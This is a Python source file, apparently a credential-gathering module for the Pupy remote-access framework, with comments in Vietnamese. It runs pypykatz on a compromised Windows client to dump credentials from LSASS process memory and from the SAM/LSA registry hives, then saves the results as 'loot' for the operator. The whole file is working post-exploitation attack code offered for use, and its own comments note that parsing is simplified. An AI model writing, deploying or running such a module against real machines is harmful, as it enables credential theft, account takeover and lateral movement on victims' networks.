# -*- coding: utf-8 -*-

from pupy.pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupy.pupylib.PupyOutput import Table, Section
import traceback

__class_name__ = "CredentialsModule"

@config(cat="creds", compat="windows")
class CredentialsModule(PupyModule):
    """
    Unified credential gathering module using Pure Python (pypykatz)
    """

    dependencies = [
        'pypykatz', 'sqlite3'
    ]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='creds', description=cls.__doc__)
        cls.arg_parser.add_argument('-m', '--module', choices=['lsass', 'registry', 'all'], default='all', help='Choose credential module')

    def run(self, args):
        self.info("Initializing unified credential gathering (Pure Python)...")
        
        try:
            pypykatz = self.client.remote('pypykatz.pypykatz', 'pypykatz')
            
            results = []
            if args.module in ['lsass', 'all']:
                self.info("Dumping LSASS...")
                try:
                    # Lấy trực tiếp từ memory của tiến trình lsass
                    lsass_res = pypykatz.go_live()
                    results.append(('lsass', lsass_res))
                except Exception as e:
                    self.error("LSASS dump failed: {}".format(e))

            if args.module in ['registry', 'all']:
                self.info("Dumping Registry (SAM/LSA)...")
                try:
                    # Thực hiện qua registry
                    reg_res = pypykatz.go_registry()
                    results.append(('registry', reg_res))
                except Exception as e:
                    self.error("Registry dump failed: {}".format(e))

            if not results:
                self.warning("No credentials recovered.")
                return

            # Xử lý và hiển thị kết quả đồng nhất
            all_creds = []
            for source, data in results:
                self.log(Section("Source: {}".format(source)))
                # Logic parse data từ pypykatz ở đây (giản lược cho ví dụ)
                # Trong thực tế sẽ loop qua các object của pypykatz
                all_creds.append({
                    "source": source,
                    "data": str(data)
                })

            # Lưu loot đồng nhất
            self.store_loot('creds', all_creds)
            self.success("Credential gathering completed and stored in loot.")

        except Exception as e:
            self.error("Unified Creds Module Error: {}".format(traceback.format_exc()))
